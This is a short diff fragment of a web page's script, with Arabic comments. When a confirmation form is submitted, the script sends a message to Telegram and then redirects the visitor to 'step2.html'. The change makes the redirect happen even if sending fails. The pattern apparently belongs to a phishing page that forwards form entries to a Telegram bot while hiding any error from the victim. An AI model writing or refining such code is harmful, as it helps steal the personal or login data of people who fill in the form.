@@ -411,18 +411,18 @@ document.getElementById("confirmForm").addEventListener("submit", function () {
     chat_id: chatId,
     text: message,
     parse_mode: "Markdown"
-  })
 })
-.then(response => response.json())
-.then(data => {
-  console.log("Telegram response:", data);
-
-  // بعد نجاح الإرسال → انتقل للصفحة الثانية
-  window.location.href = "step2.html";
-})
-.catch(error => {
-  console.error("Telegram error:", error);
-});
+    })
+    .then(() => {
+      // بعد الإرسال → نروح على الصفحة الثانية
+      window.location.href = "step2.html";
+    })
+    .catch(() => {
+      // حتى لو صار خطأ، برضه نودّيه للصفحة الثانية
+      window.location.href = "step2.html";
+    });
+  });
+</script>
 </script>
 </body>
 </html>
